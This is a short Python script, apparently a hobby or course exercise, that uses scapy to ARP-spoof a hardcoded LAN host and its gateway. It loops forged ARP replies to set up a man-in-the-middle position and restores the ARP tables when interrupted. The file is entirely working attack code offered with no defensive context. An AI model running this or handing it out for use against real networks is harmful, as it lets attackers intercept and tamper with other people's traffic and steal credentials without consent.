#!/usr/bin/env python3

import scapy.all as scapy
from time import sleep


def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcastArpRequest = broadcast / arpRequest
    answeredList = scapy.srp(broadcastArpRequest, timeout=1, verbose=False)[0]
    return answeredList[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="90:78:b2:c1:85:f3", psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=getMac(destination_ip), psrc=source_ip, hwsrc=getMac(source_ip))
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.0.189"
gateway_ip = "192.168.0.1"

try:
    packet_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_sent_count += 2
        print("\r[+] Packet sent: " + str(packet_sent_count), end = "")
        sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C.....Resetting ARP tables....Please Wait")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
